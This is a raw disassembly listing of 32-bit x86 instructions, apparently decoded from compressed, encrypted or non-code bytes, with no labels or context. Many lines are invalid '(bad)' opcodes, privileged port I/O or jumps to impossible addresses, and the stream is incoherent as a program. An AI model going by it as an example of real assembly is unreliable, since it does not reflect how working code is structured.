  402cb7:	mov    ah,0xfb
  402cb9:	stos   DWORD PTR es:[edi],eax
  402cba:	sti    
  402cbb:	jae    0x402d06
  402cbd:	mov    ecx,0x31839139
  402cc2:	or     DWORD PTR [eax],eax
  402cc4:	jmp    0xeeb8b97a
  402cc9:	(bad)  
  402cca:	out    0x50,al
  402ccc:	out    0x19,al
  402cce:	adc    edi,edi
  402cd0:	cmp    esi,DWORD PTR [ecx]
  402cd2:	mov    bh,BYTE PTR [ebp-0x2f]
  402cd5:	xor    bl,BYTE PTR [ebx+eax*1+0x2a]
  402cd9:	pop    edx
  402cda:	add    edi,edi
  402cdc:	cmp    al,0x85
  402cde:	xchg   esp,eax
  402cdf:	test   DWORD PTR [ecx+0x5e],eax
  402ce2:	out    0xff,al
  402ce4:	sbb    DWORD PTR [eax],eax
  402ce6:	push   esi
  402ce7:	pop    esp
  402ce8:	cld    
  402ce9:	rol    DWORD PTR ds:0x5ba6ffe6,0xa6
  402cf0:	je     0x402cdd
  402cf2:	imul   esp,DWORD PTR [edi+edi*8-0x5c0ebee4],0x7f
  402cfa:	xor    cl,BYTE PTR [ecx]
  402cfc:	mov    ebp,DWORD PTR [edx-0xe3d3015]
  402d02:	xor    bh,BYTE PTR [ebx+ecx*4]
  402d05:	test   DWORD PTR [ebx-0x66910734],esi
  402d0b:	adc    eax,0xe60b89e8
  402d10:	push   DWORD PTR [eax+0x79]
  402d13:	loope  0x402cdc
  402d15:	lods   al,BYTE PTR ds:[esi]
  402d16:	push   ss
  402d17:	or     DWORD PTR [eax],eax
  402d19:	jmp    0xf5b61350
  402d1e:	fisub  DWORD PTR [ecx-0x6e20c103]
  402d24:	push   ebp
  402d25:	in     eax,0x6b
  402d27:	sti    
  402d28:	imul   ebp,ecx,0x9cff0978
  402d2e:	(bad)  
  402d2f:	in     eax,0x75
  402d31:	and    edi,ebx
  402d33:	pop    ebx
  402d34:	or     BYTE PTR [esi],dl
  402d36:	dec    ecx
  402d37:	adc    eax,0xd02ebbff
  402d3c:	ret    0xc000
  402d3f:	or     DWORD PTR [ebp-0x75],edx
  402d42:	cmp    al,0x8b
  402d44:	(bad)  
  402d45:	clc    
  402d46:	push   edi
  402d47:	push   ecx
  402d48:	clc    
  402d49:	add    BYTE PTR [eax],al
  402d4b:	mov    BYTE PTR [ecx],cl
  402d4d:	add    bh,al
  402d4f:	inc    ebp
  402d50:	fld    DWORD PTR [eax]
  402d52:	add    BYTE PTR [eax-0x6faa74f7],bl
  402d58:	pusha  
  402d59:	adc    cl,BYTE PTR [ebp+0x6a50f555]
  402d5f:	mov    esp,esi
  402d61:	jne    0x402d5f
  402d63:	scas   eax,DWORD PTR es:[edi]
  402d64:	pop    ebp
  402d65:	clc    
  402d66:	jmp    DWORD PTR ds:0x8452fee5
  402d6c:	pusha  
  402d6d:	inc    ebp
  402d6e:	clc    
  402d6f:	mov    eax,ds:0x50004ca
  402d74:	pusha  
  402d75:	in     al,dx
  402d76:	push   0x59
  402d78:	inc    bp
  402d7a:	or     al,0xf8
  402d7c:	repz jne 0x402d87
  402d7f:	mov    al,ds:0xaffffc17
  402d84:	mov    al,ds:0x3c1808c2
  402d89:	mov    ebp,esp
  402d8b:	xor    dl,BYTE PTR [ecx]
  402d8d:	lea    eax,[ebp+0x1c]
  402d90:	cmp    edi,edi
  402d92:	jne    0x402d94
  402d94:	rcr    DWORD PTR [esi],0xfc
  402d97:	pop    edi
  402d98:	test   cl,0xc2
  402d9b:	adc    BYTE PTR [ecx],cl
  402d9d:	push   ebp
  402d9e:	mov    ebx,DWORD PTR [edx+ecx*4+0x7d]
  402da2:	or     al,0xd8
  402da4:	pop    esp
  402da5:	adc    al,0x83
  402da7:	popf   
  402da8:	clc    
  402da9:	push   DWORD PTR [ebx-0x2]
  402dac:	cmc    
  402dad:	jne    0x402dbf
  402daf:	add    BYTE PTR [edi],cl
  402db1:	pop    esp
  402db2:	or     al,0xff
  402db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db5:	loopne 0x402d9e
  402db7:	std    
  402db8:	xor    edi,esi
  402dba:	in     al,dx
  402dbb:	(bad)  
  402dbc:	call   0x5c402df1
  402dc1:	push   edi
  402dc2:	loopne 0x402dc3
  402dc4:	and    al,0xc2
  402dc6:	in     al,dx
  402dc7:	jne    0x402e02
  402dc9:	or     dh,BYTE PTR [eax-0x7f0c6101]
  402dcf:	jge    0x402e12
  402dd1:	bnd ja 0x402de8
  402dd4:	mov    dl,0x45
  402dd6:	add    BYTE PTR [eax],al
  402dd8:	std    
  402dd9:	jmp    0x402dc7
  402ddb:	jne    0x402dfe
  402ddd:	shl    DWORD PTR [esi+0xc],cl
  402de0:	jbe    0x402e07
  402de2:	cld    
  402de3:	out    0xa6,eax
  402de5:	mov    ds:0xb078ffec,eax
  402dea:	(bad)  
  402deb:	inc    DWORD PTR ds:0xd483df67
  402df1:	fld    QWORD PTR [ebx]
  402df3:	je     0x402e30
  402df5:	xor    DWORD PTR [esi+0xc],0x59
  402df9:	inc    eax
  402dfa:	fiadd  WORD PTR [eax]
  402dfc:	xor    DWORD PTR [edi+0x2712b01],eax
  402e02:	in     eax,dx
  402e03:	jne    0x402e42
  402e05:	arpl   WORD PTR [esi+0x8],si
  402e08:	sbb    DWORD PTR [edi],ebx
  402e0a:	in     al,dx
  402e0b:	call   FWORD PTR [esi]
  402e0d:	test   eax,0xa53108c1
  402e12:	js     0x402e00
  402e14:	add    BYTE PTR [esi],cl
  402e16:	mov    ebp,0x3b4ee7fb
  402e1b:	in     al,dx
  402e1c:	jmp    DWORD PTR [ecx-0x38]
  402e1f:	sti    
  402e20:	addr16 addr16 call 0xe7fb:0x9cee0042
  402e29:	bound  ebx,QWORD PTR [ebx]
  402e2b:	in     al,dx
  402e2c:	dec    DWORD PTR [ebx-0xe]
  402e2f:	in     al,dx
  402e30:	jne    0x402e5b
  402e32:	or     DWORD PTR [ecx],edx
  402e34:	push   edi
  402e35:	into   
  402e36:	jecxz  0x402e56
  402e38:	pop    ecx
  402e39:	xor    edx,DWORD PTR [esi-0x1b910054]
  402e3f:	xchg   esp,eax
  402e40:	sti    
  402e41:	into   
  402e42:	aas    
  402e43:	push   es
  402e44:	in     al,dx
  402e45:	scas   al,BYTE PTR es:[edi]
  402e46:	outs   dx,BYTE PTR ds:[esi]
  402e47:	jmp    0x402ec7
  402e49:	in     al,dx
  402e4a:	clc    
  402e4b:	cwde   
  402e4c:	in     al,dx
  402e4d:	and    al,0x11
  402e4f:	add    DWORD PTR [esi],edi
  402e51:	xchg   esi,eax
  402e52:	jecxz  0x402e3a
  402e54:	dec    esp
  402e55:	js     0x402e1d
  402e57:	in     eax,dx
  402e58:	add    ebx,esp
  402e5a:	pop    ebp
  402e5c:	xchg   DWORD PTR [ebp-0x1c],esi
  402e5f:	into   
  402e60:	jno    0x402e8b
  402e62:	icebp  
  402e63:	sbb    esi,ebp
  402e65:	outs   dx,BYTE PTR ds:[esi]
  402e66:	jecxz  0x402e7a
  402e68:	inc    ecx
  402e69:	xor    eax,0xb2e82c92
  402e6e:	dec    ebp
  402e6f:	(bad)  
  402e71:	enter  0xa608,0x71
  402e75:	cmp    eax,0xfc14e4
  402e7a:	dec    esi
  402e7b:	or     BYTE PTR [ebx+0x14e33eeb],dl
  402e81:	call   0xdc318bbc
  402e86:	xor    ah,dl
  402e88:	jle    0x402e75
  402e8a:	es pop ebp
  402e8c:	loope  0x402e69
  402e8e:	gs in  eax,0x6e
  402e91:	jmp    0x402e3d
  402e93:	dec    esp
  402e94:	gs mov ebp,0x50e911f3
  402e9a:	mov    edx,0x5c06af5
  402e9f:	retf   
  402ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ea1:	out    dx,eax
  402ea2:	xor    DWORD PTR [ecx],ecx
  402ea4:	jmp    0x3d8ceaac
  402ea9:	push   esp
  402eaa:	out    0x5c,al
  402eac:	add    cl,ah
  402eae:	cli    
  402eaf:	sub    ebp,esi
  402eb1:	jmp    0xa200bae8
  402eb6:	sub    edx,esp
  402eb8:	jne    0x402eab
  402eba:	jmp    0x4590:0xca16f9df
  402ec1:	adc    edx,ecx
  402ec3:	pop    esp
  402ec4:	cld    
  402ec5:	adc    DWORD PTR [edx-0x5816ff0b],ecx
  402ecb:	mov    ds:0x5c8bdf74,al
  402ed0:	clc    
  402ed1:	cdq    
  402ed2:	hlt    
  402ed3:	or     al,ch
  402ed5:	pop    eax
  402ed6:	xor    BYTE PTR [ecx],cl
  402ed8:	add    BYTE PTR [eax-0xf],dh
  402edb:	fdiv   st(7),st
  402edd:	pop    esp
  402ede:	add    BYTE PTR [ecx+0x32bddbf1],cl
  402ee4:	or     edi,edi
  402ee6:	cmp    al,0x6d
  402ee8:	jmp    0x2c8b:0xe25bc2db
  402eef:	popa   
  402ef0:	adc    cl,al
  402ef2:	mov    dh,0x82
  402ef4:	cmp    edi,edi
  402ef6:	sbb    al,0x4d
  402ef8:	jmp    0xabc9:0xe25b9f92
  402eff:	ds loop 0x402f56
  402f02:	bound  ebx,QWORD PTR [esi-0x7a]
  402f05:	les    edi,FWORD PTR [ecx-0xd]
  402f08:	dec    ebx
  402f09:	hlt    
  402f0a:	jmp    0x64403841
  402f0f:	jno    0x402ef6
  402f11:	push   eax
  402f12:	outs   dx,BYTE PTR ds:[esi]
  402f13:	mov    eax,ds:0xe929e811
  402f18:	or     BYTE PTR [eax],al
  402f1a:	fs repnz pusha 
  402f1d:	dec    ebp
  402f1e:	push   esi
  402f1f:	adc    DWORD PTR [ecx],0xe20575e8
  402f25:	inc    DWORD PTR [eax]
  402f27:	popa   
  402f28:	dec    ecx
  402f29:	clc    
  402f2a:	and    DWORD PTR [ebp+0x347204ed],0xffffff8a
  402f31:	ins    DWORD PTR es:[edi],dx
  402f32:	clc    
  402f33:	int3   
  402f34:	out    dx,al
  402f35:	jne    0x402f33
  402f37:	and    BYTE PTR [edi-0x14],ch
  402f3a:	add    al,bl
  402f3c:	loop   0x402efd
  402f3e:	je     0x402f1a
  402f40:	out    dx,al
  402f41:	jne    0x402f3b
  402f43:	add    BYTE PTR [eax+0x43],bh
  402f46:	add    al,ch
  402f48:	cdq    
  402f49:	or     BYTE PTR [eax],al
  402f4b:	add    BYTE PTR [edi+0x11d0f79d],dl
  402f51:	dec    ecx
  402f52:	hlt    
  402f53:	call   FWORD PTR ds:0x6467e8ea
  402f59:	or     al,0x0
  402f5b:	jmp    0x402fdb
  402f5d:	lock jne 0x402f68
  402f60:	jo     0x402fa3
  402f62:	sti    
  402f63:	jmp    DWORD PTR [edi+0x3]
  402f66:	ror    cl,0x9a
  402f69:	or     BYTE PTR [eax],al
  402f6b:	jmp    0x402fbb
  402f6d:	add    al,0xc0
  402f6f:	leave  
  402f70:	mov    cl,BYTE PTR [eax]
  402f72:	add    BYTE PTR [edx+0x4a],ch
  402f75:	inc    ebx
  402f76:	cld    
  402f77:	jmp    FWORD PTR ds:0x9104e7e5
  402f7d:	out    dx,eax
  402f7e:	inc    edi
  402f80:	or     eax,0x480001dd
  402f85:	add    eax,0x35a8458d
  402f8a:	push   DWORD PTR [ebp+0x20]
  402f8d:	(bad)  
  402f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f91:	repnz cmp DWORD PTR [ebp-0x68],0x5
  402f96:	je     0x402faa
  402f98:	pop    es
  402f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f9a:	cmp    eax,DWORD PTR [ebp+0x5c]
  402f9d:	jo     0x402fa6
  402f9f:	mov    eax,0x3f131
  402fa4:	xor    DWORD PTR [ebx+0x2],ecx
  402fa7:	sub    eax,DWORD PTR [eax]
  402fa9:	icebp  
  402faa:	cmp    eax,DWORD PTR [esi]
  402fac:	sub    esi,ecx
  402fae:	sbb    esi,eax
  402fb0:	add    al,0x31
  402fb2:	jge    0x403030
  402fb4:	in     al,dx
  402fb5:	mov    dl,0x26
  402fb7:	in     al,dx
  402fb8:	lea    esi,[esi+eiz*1+0x54]
  402fbc:	(bad)  
  402fbd:	cmp    al,0xda
  402fbf:	fistp  DWORD PTR [edx]
  402fc1:	int3   
  402fc2:	repnz add eax,DWORD PTR [ebp-0xe3850f]
  402fc9:	and    al,0xda
  402fcb:	fucomi st,st(6)
  402fcd:	test   eax,0xf489e8df
  402fd2:	fld1   
  402fd4:	jne    0x402f6b
  402fd6:	or     ah,ch
  402fd8:	jmp    0x40300b
  402fda:	repnz cld 
  402fdc:	mov    edi,0x75e8d5fd
  402fe1:	sub    eax,0xe1f86eb7
  402fe6:	leave  
  402fe7:	or     esi,DWORD PTR cs:[ecx]
  402fea:	bnd call 0xd2fa9565
  402ff0:	jmp    0x403023
  402ff2:	bnd call 0xd30a596d
  402ff8:	cli    
  402ff9:	dec    esi
  402ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffb:	mov    edx,0x4ef239c2
  403000:	mov    ecx,DWORD PTR [ebp+0x73]
  403003:	mov    edi,0xcccae2e8
  403008:	lea    esi,[esi+eax*4+0x53]
  40300c:	inc    DWORD PTR [eax]
  40300e:	pushf  
  40300f:	fcmovu st,st(3)
  403011:	retf   0xf20d
  403014:	add    eax,DWORD PTR [ebp-0x4884410f]
  40301a:	xor    DWORD PTR [ecx],ecx
  40301c:	jmp    0xf1963624
  403021:	fistp  DWORD PTR [ebx-0x5717a920]
  403027:	inc    ebp
  403028:	push   ebp
  403029:	call   0x78920d92
  40302e:	fimul  DWORD PTR [eax]
  403030:	jmp    0x6d4fcf31
  403035:	xchg   DWORD PTR [ecx],esi
  403037:	or     ecx,ebp
  403039:	jp     0x4030af
  40303b:	fldenv [esi]
  40303d:	outs   dx,BYTE PTR ds:[esi]
  40303e:	mov    ebp,0x30047bf0
  403043:	or     DWORD PTR [edx-0x41],ebp
  403046:	sub    eax,0x103e906
  40304b:	or     DWORD PTR [ecx-0x16f72725],ebx
  403051:	add    ebp,DWORD PTR [eax+0x1ce80545]
  403057:	aad    0x1
  403059:	push   0x82e90a32
  40305e:	ins    DWORD PTR es:[edi],dx
  40305f:	add    al,0xe4
  403061:	add    esi,DWORD PTR [ecx]
  403063:	stc    
  403064:	call   0xe9b8b9bc
  403069:	add    esi,DWORD PTR [ecx]
  40306b:	xchg   edx,eax
  40306c:	sub    al,0xdc
  40306e:	fisttp DWORD PTR [eax]
  403070:	mov    esi,0xdf4d0071
  403075:	cmp    al,0xf0
  403077:	push   esi
  403078:	push   ebp
  403079:	shl    edi,0xc4
  40307c:	fcom   DWORD PTR [ecx-0x16f5cda3]
  403082:	xor    BYTE PTR [ebp-0xc],0x5f
  403086:	inc    ecx
  403087:	cmp    edi,ebx
  403089:	adc    al,0xe8
  40308b:	sbb    DWORD PTR [edi],edx
  40308d:	xchg   edx,eax
  40308e:	add    al,0x31
  403090:	fdivrp st(4),st
  403092:	sti    
  403093:	push   ss
  403094:	cwde   
  403095:	add    BYTE PTR [ebx+0xe],dh
  403098:	fild   QWORD PTR [edx-0x1f]
  40309b:	push   0x19
  40309d:	dec    eax
  40309e:	test   al,0x32
  4030a0:	fidiv  WORD PTR [ebp-0xf]
  4030a3:	fiadd  DWORD PTR ds:0x130e56fd
  4030a9:	fmul   DWORD PTR [esi+0x60]
  4030ac:	aad    0xff
  4030ae:	mov    esp,0x3de2e6ea
  4030b3:	(bad)  
  4030b4:	fisub  WORD PTR [ebx]
  4030b6:	adc    esi,ecx
  4030b8:	push   esp
  4030b9:	clc    
  4030ba:	cs inc eax
  4030bc:	icebp  
  4030bd:	call   FWORD PTR [edx+ecx*8-0x29e3f71a]
  4030c4:	fisub  WORD PTR [ebx]
  4030c6:	xor    esi,ecx
  4030c8:	push   esp
  4030c9:	in     al,dx
  4030ca:	add    DWORD PTR [esi],edi
  4030cc:	or     DWORD PTR [eax],eax
  4030ce:	jmp    0x12288562
  4030d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030d4:	fdivp  st(7),st
  4030d6:	jmp    0x894bfdb
  4030db:	add    DWORD PTR [eax+eiz*8-0x35f41901],eax
  4030e2:	pop    ebx
  4030e3:	mov    al,0x70
  4030e5:	add    eax,0xecfa3c00
  4030ea:	or     DWORD PTR [ebp+ebp*2-0x22],0x73
  4030ef:	icebp  
  4030f0:	dec    edi
  4030f1:	push   esp
  4030f2:	or     cl,dl
  4030f4:	outs   dx,DWORD PTR ds:[esi]
  4030f5:	repz add cl,ch
  4030f8:	cmp    ecx,ecx
  4030fa:	leave  
  4030fb:	stos   DWORD PTR es:[edi],eax
  4030fc:	dec    esi
  4030fd:	ficom  WORD PTR [edx+esi*2+0x5e]
  403101:	xchg   edx,eax
  403102:	inc    ebp
  403103:	icebp  
  403104:	xor    DWORD PTR [ecx+0x3932e900],ecx
  40310a:	push   0x29
  40310c:	or     eax,0x1800eac5
  403111:	or     cl,cl
  403113:	ret    0xa14
  403116:	push   ebp
  403117:	mov    ebp,DWORD PTR [esi+ecx*2-0x1de27404]
  40311e:	mov    cl,BYTE PTR [ebp-0x4]
  403121:	jmp    0x2b02:0xbd49510e
  403128:	dec    eax
  403129:	fld    TBYTE PTR [ebx+0x3e55b59]
  40312f:	repz ret 0xc946
  403133:	ret    0x9e0
  403136:	push   ebp
  403137:	mov    ebp,DWORD PTR [esp+ecx*2+0x57]
  40313b:	mov    eax,DWORD PTR [eax]
  40313d:	popf   
  40313e:	aad    0xfb
  403140:	mov    esp,DWORD PTR [ebp-0x47b2751f]
  403146:	jmp    0xc95e:0x4764f302
  40314d:	pop    edx
  40314e:	(bad)  
  40314f:	call   DWORD PTR [ebx+eiz*1-0x4a]
  403153:	push   esi
  403154:	push   edi
  403155:	and    ebx,DWORD PTR [ecx+0x8]
  403158:	cld    
  403159:	adc    esp,DWORD PTR [ecx]
  40315b:	adc    BYTE PTR [ebx],ch
  40315d:	pop    eax
  40315e:	arpl   WORD PTR [ebp+0xc],di
  403161:	jnp    0x40316d
  403163:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403165:	and    DWORD PTR [edx+0x44480175],0x5e
  40316c:	leave  
  40316d:	call   0x83c0:0xe354ffe0
  403174:	les    ebx,FWORD PTR [esi+ecx*2+0xaf05357]
  40317b:	add    DWORD PTR [eax],eax
  40317d:	pop    eax
  40317e:	in     al,0x75
  403180:	or     BYTE PTR [eax-0x60000087],ah
  403186:	pop    edi
  403187:	jge    0x403191
  403189:	xor    DWORD PTR [edi],ebp
  40318b:	cmp    eax,0x43a032b
  403190:	add    DWORD PTR [ecx],esi
  403192:	bnd jnp 0x4031a9
  403195:	pop    ebx
  403196:	pop    esp
  403197:	ret    0x18e2
  40319a:	push   0x23760867
  40319f:	jns    0x403216
  4031a1:	add    BYTE PTR ds:0x31fe3f2c,dh
  4031a7:	idiv   DWORD PTR [edx+0x68da2b]
  4031ad:	cmp    edi,DWORD PTR [ecx+0x6c00e4a5]
  4031b3:	inc    esp
  4031b4:	jp     0x4031ba
  4031b6:	and    dl,dh
  4031b8:	ds (bad) 
  4031ba:	es pop esp
  4031bc:	dec    edi
  4031bd:	(bad)  
  4031be:	mov    ebx,0x2d8829e6
  4031c3:	out    0x79,eax
  4031c5:	inc    ebp
  4031c6:	mov    esi,0x703a005a
  4031cb:	mov    bh,0x36
  4031cd:	adc    BYTE PTR [ebx],ah
  4031cf:	lock sbb cl,cl
  4031d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d3:	das    
  4031d4:	outs   dx,DWORD PTR ds:[esi]
  4031d5:	aad    0xfa
  4031d7:	jp     0x40321e
  4031d9:	leave  
  4031da:	jae    0x4031c2
  4031dc:	add    edx,DWORD PTR [ebp-0x46]
  4031df:	fiadd  WORD PTR [eax+0x4e1f89c4]
  4031e5:	push   edi
  4031e6:	jle    0x40321d
  4031e8:	cld    
  4031e9:	pop    edx
  4031ea:	stos   DWORD PTR es:[edi],eax
  4031eb:	out    dx,eax
  4031ec:	jnp    0x403233
  4031ee:	ins    BYTE PTR es:[edi],dx
  4031ef:	push   0x2db90140
  4031f4:	call   0x3d638c84
  4031f9:	mov    ebx,esp
  4031fb:	in     eax,0xbc
  4031fd:	inc    ebp
  4031fe:	dec    ecx
  4031ff:	repnz add eax,DWORD PTR [eax]
  403202:	xor    DWORD PTR [ecx],ecx
  403204:	jb     0x40323c
  403206:	add    BYTE PTR [ecx],ah
  403208:	call   0xde2d1836
  40320d:	out    0xad,al
  40320f:	je     0x4031ef
  403211:	fisubr WORD PTR [ebp+0x4e71213d]
  403217:	push   ds
  403218:	or     DWORD PTR [eax+ebp*8],edx
  40321b:	es xchg ebx,eax
  40321d:	sub    al,0xe8
  40321f:	mov    ebx,0x5c7bb0f4
  403224:	fcomi  st,st(6)
  403226:	lods   eax,DWORD PTR ds:[esi]
  403227:	je     0x403207
  403229:	jno    0x40323a
  40322b:	cmp    DWORD PTR [edi+ebx*4],ecx
  40322e:	ds in  eax,dx
  403230:	mov    ?,WORD PTR [esp+eiz*8+0x7a00f4b9]
  403237:	test   ah,bl
  403239:	jmp    0x403289
  40323b:	xlat   BYTE PTR ds:[ebx]
  40323c:	mov    ds,ebp
  40323e:	sub    DWORD PTR [edx+0x1d333145],edi
  403244:	sbb    DWORD PTR [esi],esp
  403246:	ds mov ecx,0x6c7929e6
  40324c:	fisub  WORD PTR [ecx+0x0]
  40324f:	mov    ebx,0xf27b0d45
  403254:	or     DWORD PTR [esi+0x2bd1fa45],esp
  40325a:	not    DWORD PTR [esi-0x4f289dcc]
  403260:	(bad)  
  403261:	std    
  403262:	in     al,0x86
  403264:	fstp   TBYTE PTR [edx]
  403266:	das    
  403267:	pop    edx
  403268:	lea    esp,[eax+eiz*8]
  40326b:	add    cl,ah
  40326d:	fistp  DWORD PTR [esp+ecx*1+0x59]
  403271:	push   ebp
  403272:	ret    
  403273:	add    al,0x31
  403275:	xchg   BYTE PTR [ecx-0x168d56ed],ch
  40327b:	add    esi,DWORD PTR [ecx]
  40327d:	fadd   QWORD PTR [eax]
  40327f:	cmp    al,0x3d
  403281:	icebp  
  403282:	inc    ebp
  403283:	mov    bh,0x52
  403285:	fisttp DWORD PTR [ecx+0x75db592c]
  40328b:	popf   
  40328c:	inc    ebp
  40328d:	push   ds
  40328e:	jmp    0xc04e657c
  403293:	adc    eax,0x79459092
  403298:	adc    dl,BYTE PTR [ebp-0xc]
  40329b:	xchg   ecx,eax
  40329c:	mov    ebx,ebx
  40329e:	push   DWORD PTR [esi-0x44]
  4032a1:	inc    esp
  4032a2:	clc    
  4032a3:	outs   dx,BYTE PTR ds:[esi]
  4032a4:	push   0xdadcffd5
  4032a9:	fidiv  DWORD PTR [ebp+0x59]
  4032ac:	add    eax,0xd256fe8e
  4032b1:	fidiv  DWORD PTR [ebp+0x4d]
  4032b4:	aad    0x1
  4032b6:	jmp    0x761a65a4
  4032bb:	in     eax,dx
  4032bc:	retf   0xe905
  4032bf:	jmp    0xb53f6bf6
  4032c4:	mov    WORD PTR ss:[ebp-0x252ce9],es
  4032cb:	mov    ecx,0x16fea4ca
  4032d0:	add    BYTE PTR [edx-0x6dea8a26],dl
  4032d6:	push   esp
  4032d7:	clc    
  4032d8:	je     0x403282
  4032da:	jmp    0x4032da
  4032dc:	(bad)  
  4032dd:	xchg   ebx,eax
  4032de:	cmp    eax,ebp
  4032e0:	not    DWORD PTR [eax-0x16110026]
  4032e6:	adc    al,ch
  4032e8:	push   esp
  4032e9:	pop    ebp
  4032ea:	(bad)  
  4032ec:	push   ebx
  4032ed:	and    eax,0xf4213b71
  4032f2:	or     bh,bh
  4032f4:	push   esp
  4032f5:	xor    eax,0x7200bbf1
  4032fa:	out    0xff,eax
  4032fc:	or     edx,DWORD PTR [eax-0x780b8a19]
  403302:	inc    ecx
  403303:	clc    
  403304:	(bad)  
  403305:	std    
  403306:	or     al,0xe8
  403308:	stos   DWORD PTR es:[edi],eax
  403309:	xchg   edx,eax
  40330a:	out    0xff,eax
  40330c:	and    esi,DWORD PTR [eax-0x19]
  40330f:	jne    0x403309
  403311:	mov    al,0x9a
  403313:	std    
  403314:	push   DWORD PTR [edi-0x3ff78a1a]
  40331a:	test   al,0xf7
  40331c:	call   DWORD PTR [edi-0x2ea43c75]
  403322:	ret    
  403323:	or     BYTE PTR [eax],al
  403325:	sbb    eax,0x4c83ec8a
  40332a:	mov    dl,0x57
  40332c:	mov    ecx,ebp
  40332e:	ror    DWORD PTR [edx],1
  403330:	ror    BYTE PTR [eax+edx*1],0xc7
  403334:	add    BYTE PTR [eax],al
  403336:	fadd   DWORD PTR ds:0xe6430000
  40333c:	cmp    DWORD PTR [ebp-0x30],0x4
  403340:	jne    0x403349
  403342:	inc    edx
  403343:	push   es
  403344:	add    al,BYTE PTR [eax]
  403346:	fsubr  st,st(2)
  403348:	jae    0x754210e3
  40334e:	iret   
  40334f:	jnp    0x403351
  403351:	add    DWORD PTR [eax+0x7302eb05],ebx
  403357:	xchg   ebx,eax
  403358:	or     edx,0x20591
  40335e:	add    eax,0xaa50fc51
  403363:	imul   eax,DWORD PTR [eax],0xffffffff
  403366:	std    
  403367:	or     edi,edi
  403369:	jne    0x4032eb
  40336b:	in     eax,dx
  40336c:	mov    ds:0xb0588e9,al
  403371:	shl    BYTE PTR [ecx],0x3d
  403374:	jno    0x403303
  403376:	in     al,dx
  403377:	mov    bh,0x34
  403379:	push   0x31
  40337b:	push   ebp
  40337c:	inc    edi
  40337d:	hlt    
  40337e:	add    DWORD PTR [esi],esi
  403380:	add    al,0xff
  403382:	les    edi,FWORD PTR [edi-0x38ba8a20]
  403388:	(bad)
  40338c:	or     al,0xc0
  40338e:	mov    esp,0x297d852b
  403393:	jecxz  0x4033ec
  403395:	inc    esi
  403396:	mov    dl,0x5
  403398:	fadd   DWORD PTR [ecx]
  40339a:	add    BYTE PTR [eax+ebp*8-0x1de6827c],ah
  4033a1:	push   edi
  4033a2:	cmp    bh,BYTE PTR [edx+0x6140dc25]
  4033a8:	mov    al,BYTE PTR [edx-0x3]
  4033ab:	(bad)  
  4033ac:	outs   dx,DWORD PTR ds:[esi]
  4033ad:	(bad)  
  4033ae:	clc    
  4033af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033b0:	lods   eax,DWORD PTR ds:[esi]
  4033b1:	fist   DWORD PTR [eax-0x7a]
  4033b4:	int3   
  4033b5:	add    ebp,DWORD PTR [edx+0x31]
  4033b8:	inc    edi
  4033b9:	push   edi
  4033ba:	adc    dh,bl
  4033bc:	xchg   ebp,eax
  4033bd:	fucomip st,st(0)
  4033bf:	jle    0x4033fa
  4033c1:	add    al,0x0
  4033c3:	cmp    ah,BYTE PTR [edx]
  4033c5:	pop    eax
  4033c6:	or     bl,BYTE PTR [esi+0x4a]
  4033c9:	sub    ebp,edi
  4033cb:	mov    esi,0xcaff2d2f
  4033d0:	out    0x8c,al
  4033d2:	inc    ebp
  4033d3:	inc    ebp
  4033d4:	jmp    0x403399
  4033d6:	je     0x403404
  4033d8:	pop    es
  4033d9:	push   edi
  4033da:	clc    
  4033db:	scas   al,BYTE PTR es:[edi]
  4033dc:	loop   0x4033be
  4033de:	jne    0x403375
  4033e0:	cli    
  4033e1:	sbb    al,0xe9
  4033e3:	xor    edx,esp
  4033e5:	mov    edi,es
  4033e7:	cmp    ah,BYTE PTR [edx]
  4033e9:	push   edi
  4033ea:	sbb    al,0xb2
  4033ec:	or     DWORD PTR [esp+edi*8+0x30],esp
  4033f0:	pop    esp
  4033f1:	test   DWORD PTR [esp+esi*8+0x663428f0],0xe4e0f55e
  4033fc:	clc    
  4033fd:	lds    edx,FWORD PTR [esi+0x0]
  403400:	and    eax,0x590c34d8
  403405:	sub    dh,BYTE PTR [esi-0x5fc7b920]
  40340b:	lds    esp,FWORD PTR ds:0x458d3c09
  403411:	mov    bl,BYTE PTR [esp+ecx*1]
  403414:	xor    BYTE PTR [ecx],cl
  403416:	jmp    0x8e42d09e
  40341b:	push   ss
  40341c:	add    eax,DWORD PTR [ecx+0x28]
  40341f:	add    al,0xa6
  403421:	dec    ebp
  403422:	icebp  
  403423:	ins    DWORD PTR es:[edi],dx
  403424:	xor    eax,ebx
  403426:	cld    
  403427:	test   DWORD PTR [edi],0x84e0d95e
  40342d:	add    eax,0xe1295666
  403432:	push   ebp
  403433:	loope  0x403423
  403435:	xlat   BYTE PTR ds:[ebx]
  403436:	and    ch,al
  403438:	inc    ecx
  403439:	or     DWORD PTR [edx],eax
  40343b:	les    ebp,FWORD PTR [edx-0x671ae748]
  403441:	add    ecx,ebp
  403443:	add    esi,DWORD PTR [ecx]
  403445:	mov    edx,0x8a355443
  40344a:	cmp    edx,DWORD PTR [edx]
  40344c:	mov    ds:0xc38225a1,eax
  403451:	stc    
  403452:	div    edx
  403454:	inc    ecx
  403455:	jmp    0x40345e
  403457:	mov    bh,BYTE PTR ds:0xf08aa98e
  40345d:	or     BYTE PTR [edi],al
  40345f:	ret    
  403460:	sbb    al,0xb3
  403462:	sub    dh,BYTE PTR [esi]
  403464:	add    BYTE PTR [edx-0x4a61ff1c],bh
  40346a:	dec    ebp
  40346b:	or     dh,dh
  40346d:	ret    
  40346e:	cmp    DWORD PTR [ebp-0xb],0xffffffab
  403472:	inc    ebp
  403473:	adc    dl,dh
  403475:	jge    0x4034d3
  403477:	sbb    BYTE PTR [edx-0x63],ah
  40347a:	leave  
  40347b:	jmp    0x2dc6:0x251040e1
  403482:	or     DWORD PTR [eax],eax
  403484:	jb     0x4034bf
  403486:	mov    es,WORD PTR [eax+0x60]
  403489:	in     al,dx
  40348a:	or     BYTE PTR [ebx],dh
  40348c:	stos   DWORD PTR es:[edi],eax
  40348d:	imul   dl
  40348f:	call   0xc977b232
